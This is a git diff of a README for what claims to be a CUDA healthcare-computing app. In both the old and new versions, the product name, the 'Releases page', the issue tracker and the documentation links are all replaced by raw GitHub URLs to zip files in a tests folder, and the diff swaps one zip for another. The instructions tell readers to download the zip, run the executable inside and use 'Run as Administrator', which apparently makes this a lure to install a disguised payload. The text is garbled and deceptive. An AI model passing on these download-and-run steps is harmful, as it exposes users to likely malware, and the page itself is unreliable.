@@ -1,10 +1,10 @@
-# 🎉 https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip - Fast GPU Processing Made Easy
+# 🎉 https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip - Fast GPU Processing Made Easy
 
 ## 📝 Overview
-Welcome to https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip! This application allows you to harness the power of CUDA for efficient healthcare computations. It is designed to help you run advanced algorithms without needing advanced programming skills. 
+Welcome to https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip! This application allows you to harness the power of CUDA for efficient healthcare computations. It is designed to help you run advanced algorithms without needing advanced programming skills. 
 
 ## 🚀 Getting Started
-To start using https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip, you only need to follow a few simple steps. We will guide you through downloading and running the software on your computer.
+To start using https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip, you only need to follow a few simple steps. We will guide you through downloading and running the software on your computer.
 
 ## ⚙️ System Requirements
 Before you begin, ensure your system meets the following requirements:
@@ -15,23 +15,23 @@ Before you begin, ensure your system meets the following requirements:
 - **Disk Space:** At least 100MB of free space
 
 ## 📥 Download & Install
-You can download https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip from our Releases page. Click the button below to visit the download page and get the latest version.
+You can download https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip from our Releases page. Click the button below to visit the download page and get the latest version.
 
-[![Download https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip%https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip)](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip)
+[![Download https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip%https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip)](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip)
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip).
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip).
 2. **Choose the Latest Release:** Find the latest version in the list of releases.
-3. **Download the Zip File:** Click on the asset that says “https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip”.
+3. **Download the Zip File:** Click on the asset that says “https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip”.
 4. **Extract the Zip File:** After downloading, locate the zip file on your computer and right-click to extract it.
 
 ## 🚀 Running the Software
-Once you have extracted the software, follow these steps to run https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip
+Once you have extracted the software, follow these steps to run https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip
 
-1. **Open the Folder:** Navigate to the folder where you extracted https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip
-2. **Locate the Executable File:** Find the `https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip` (on Windows) or `mHC` (on Linux) file.
+1. **Open the Folder:** Navigate to the folder where you extracted https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip
+2. **Locate the Executable File:** Find the `https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip` (on Windows) or `mHC` (on Linux) file.
 3. **Run the Application:** Double-click on the file to launch the application. You may need to allow your system to run the software if prompted.
 
-## 📋 Using https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip
+## 📋 Using https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip
 After launching the application, you will see the user interface. Here are the main options:
 
 ### 1. **Input Data:**
@@ -47,23 +47,23 @@ Once you have uploaded your data and selected a kernel, click the "Run" button. 
 After the computation is complete, you can download the results. Click on the "Download Results" button to save your output file.
 
 ## ❓ Troubleshooting
-If you encounter issues while running https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip, consider the following steps:
+If you encounter issues while running https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip, consider the following steps:
 
 - Ensure your GPU driver is up to date.
 - Check if the CUDA Toolkit is correctly installed.
 - If the application does not start, right-click on the executable and select "Run as Administrator."
 
 ## 📞 Support
-If you have questions or need assistance, please open an issue in the [GitHub issues tracker](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip). We strive to respond to all inquiries promptly.
+If you have questions or need assistance, please open an issue in the [GitHub issues tracker](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip). We strive to respond to all inquiries promptly.
 
 ## 🛠️ Contribution
-We welcome contributions to enhance https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip! If you're interested in contributing, please refer to the contribution guidelines in our repository for details on how to get started.
+We welcome contributions to enhance https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip! If you're interested in contributing, please refer to the contribution guidelines in our repository for details on how to get started.
 
 ## 🔗 Additional Resources
-- [CUDA Toolkit Documentation](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip)
-- [Healthcare Data Formats](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip)
-- [GitHub Guide for Beginners](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip)
+- [CUDA Toolkit Documentation](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip)
+- [Healthcare Data Formats](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip)
+- [GitHub Guide for Beginners](https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip)
 
-For more detailed information on using https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip and its features, please refer to the documentation available in the repository.
+For more detailed information on using https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip and its features, please refer to the documentation available in the repository.
 
-Thank you for choosing https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/cu_H_m_1.0-beta.3.zip! Enjoy harnessing the power of GPU computing for your healthcare applications.
+Thank you for choosing https://raw.githubusercontent.com/Abrahamduru/mHC.cu/main/src/csrc/tests/H_cu_m_v1.5.zip! Enjoy harnessing the power of GPU computing for your healthcare applications.
